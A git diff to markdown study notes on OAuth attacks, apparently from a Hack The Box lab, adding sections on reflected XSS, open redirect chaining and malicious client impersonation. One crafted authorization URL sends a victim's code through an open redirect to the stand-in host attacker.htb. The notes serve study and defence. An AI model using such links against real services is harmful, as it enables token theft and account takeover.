@@ -3,6 +3,7 @@
 - [Common Grant Types](#common-grant-types)
 - [Stealing Access Tokens](#stealing-access-tokens)
 - [Improper CSRF Protection](#improper-csrf-protection)
+- [Additional OAuth Vulnerabilities](#additional-oauth-vulnerabilities)
 
 
 
@@ -122,9 +123,9 @@
 
 ## Stealing Access Tokens
 
-- This attack steals user access tokens by exploiting weak redirect_uri validation on the Authorization Server.How it works:
+- This attack steals user access tokens by exploiting weak `redirect_uri` validation on the Authorization Server.How it works:
 
-    1. Attacker crafts malicious link: Creates an OAuth authorization request with a redirect_uri pointing to their server.
+    1. Attacker crafts malicious link: Creates an OAuth authorization request with a `redirect_uri` pointing to their server.
     2. Attacker lures victim: Tricks the victim into clicking the link.
     3. Victim grants permission: Victim authenticates with the legitimate Authorization Server.
     4. Authorization Server redirects to attacker: Due to poor validation, the Authorization Server sends the authorization_code to the attacker's server.
@@ -148,8 +149,66 @@ username=attacker&password=attacker&client_id=0e8f12335b0bf225&redirect_uri=%2Fc
 ```http
 http://hubgit.htb/client/callback?code=Z0FBQUFBQm1BekxRVGFLdTk5WHZycU9zZ0dCS2IzaWwzWTkxME9tVHJPbXpibTVLV0g0MVRyUVhCSF9vVHVNSHdXX0NZV2FzTHEzTzRFLW5wejU5ai1ONVdxMlc0LU0wMDdURXVPRGYtX05Mb21mZTljTUtzTWwxa1pvdktUVzlWcXJFNzMtZGJ1eWtKcllFQy0xd3RlM3JXUzczUEUtU3lnPT0
 ```
+## Additional OAuth Vulnerabilities
+1. **Reflected XSS**
+
+- If we take a look at the authorization request , we can see that there are three parameters from our request that may be reflect as hidden values in the response:
+
+![OAuth xss1](/images/oauth_xss_1.jpg)
+
+- If the web application does not properly sanitize these values, they may lead to reflected XSS. We can test these values by injecting a simple alert proof of concept payload:
+
+![OAuth xss2](/images/oauth_xss_2.jpg)
+
+2. **Open Redirect Chaining**
+- This attack works when the legitimate application's website has an "Open Redirect" vulnerability, even if the OAuth server properly validates the main redirect URL.
+
+- Problem Prevention (Usually):
+
+    - OAuth servers prevent code theft by whitelisting redirect_uris.
+    - They only allow the authorization_code to be sent back to approved domains. This checks the start of the URL.
 
 
+- How the Attacker Combines Them:
+
+    1. Attacker Crafts Malicious Link: The attacker creates an OAuth authorization request where the redirect_uri points to the legitimate app's Open Redirect, and that Open Redirect points to the attacker's server.
+    ```http
+    http://hubgit.htb/auth?client_id=...&redirect_uri=http://academy.htb/redirect?u=http://attacker.htb/callback
+    ```
+    2. Validation Passes: hubgit.htb (the OAuth server) checks http://academy.htb/ and says "Okay, that's whitelisted!"
+
+    3. Victim Authorizes: The user logs in and approves the request on hubgit.htb.
+
+    4. Code Sent to Open Redirect: hubgit.htb sends the authorization_code to http://academy.htb/redirect.
+
+    5. Open Redirect Passes Code to Attacker: academy.htb/redirect then automatically redirects the user's browser (and the authorization_code) to http://attacker.htb/callback.
+
+    6. Code Stolen: The attacker's server (attacker.htb) now receives the authorization_code.
+
+3. **Malicious Client Impersonation**
+- This attack happens when an attacker creates their own fake app (a "malicious client") and a legitimate app fails to properly check who an access token was meant for.
+
+- Attacker's Setup:
+
+    - The attacker creates their own website/app (e.g., evil.htb).
+
+    - They register evil.htb as an official "OAuth client" with a big service like hubgit.htb (the Authorization Server). hubgit.htb doesn't know evil.htb is malicious, only that it's a registered app.
+
+- Victim's Interaction (Unknowing):
+
+    - The attacker tricks a victim into using their hubgit.htb account to "Log in with OAuth" on the attacker's fake app, evil.htb.
+
+    - The victim approves this login on hubgit.htb.
+
+    - hubgit.htb (the Authorization Server) then correctly gives evil.htb (the attacker's app) an access token for the victim's hubgit.htb account. The token is valid and legitimately issued to evil.htb.
+
+- The Crucial Flaw (in Another App):
+
+    - Now, the attacker has a valid access token for the victim's hubgit.htb account, issued for evil.htb.
+
+    - The attacker then tries to use this same access token to access another legitimate app that also uses hubgit.htb for login (e.g., academy.htb).
+
+    - The vulnerability: If academy.htb (the other legitimate app) is poorly implemented and doesn't check if the access token was actually issued to it (academy.htb) or to some other client (evil.htb), it will simply accept the token.
 
 ## Resources
 - [Hidden OAuth attack vectors](https://portswigger.net/research/hidden-oauth-attack-vectors)
